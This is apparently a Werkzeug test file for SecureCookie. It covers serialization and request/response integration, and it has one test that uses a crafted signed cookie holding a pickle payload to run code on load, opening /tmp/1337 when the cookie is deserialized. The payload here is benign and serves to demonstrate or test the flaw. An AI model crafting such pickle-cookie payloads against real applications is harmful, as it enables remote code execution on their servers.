from werkzeug.utils import parse_cookie
from werkzeug.wrappers import Request, Response
from werkzeug.contrib.securecookie import SecureCookie


def test_basic_support():
    """Basid SecureCookie support"""
    c = SecureCookie(secret_key='foo')
    assert c.new
    print c.modified, c.should_save
    assert not c.modified
    assert not c.should_save
    c['x'] = 42
    assert c.modified
    assert c.should_save
    s = c.serialize()

    c2 = SecureCookie.unserialize(s, 'foo')
    assert c is not c2
    assert not c2.new
    assert not c2.modified
    assert not c2.should_save
    assert c2 == c

    c3 = SecureCookie.unserialize(s, 'wrong foo')
    assert not c3.modified
    assert not c3.new
    assert c3 == {}


def test_wrapper_support():
    """Securecookie wrapper integration"""
    req = Request.from_values()
    resp = Response()
    c = SecureCookie.load_cookie(req, secret_key='foo')
    assert c.new
    c['foo'] = 42
    assert c.secret_key == 'foo'
    c.save_cookie(resp)

    req = Request.from_values(headers={
        'Cookie':  'session="%s"' % parse_cookie(resp.headers['set-cookie'])['session']
    })
    c2 = SecureCookie.load_cookie(req, secret_key='foo')
    assert not c2.new
    assert c2 == c


def test_pickle_exploit():
    """
    Exploit SecureCookie use of pickle for running arbitrary code.

    The used pickle is:
    >>> "(S'/tmp/1337'\np1\nS'w'\np2\ni__builtin__\nopen\np3\n(dp4\nb."
    
    """
    import os
    CRAFTED_COOKIE = "1uy1JJYjjPFcZmyy235olMQoYbU=?foo=KFMnL3RtcC8xMzM3JwpwMQpTJ3cnCnAyCmlfX2J1aWx0aW5fXwpvcGVuCnAzCihkcDQKYi4="
        
    req = Request.from_values(headers={
        'Cookie':  'session="%s"' % CRAFTED_COOKIE
    })
    c = SecureCookie.load_cookie(req, secret_key='foo')
    assert not c.new
    assert os.path.exists('/tmp/1337')
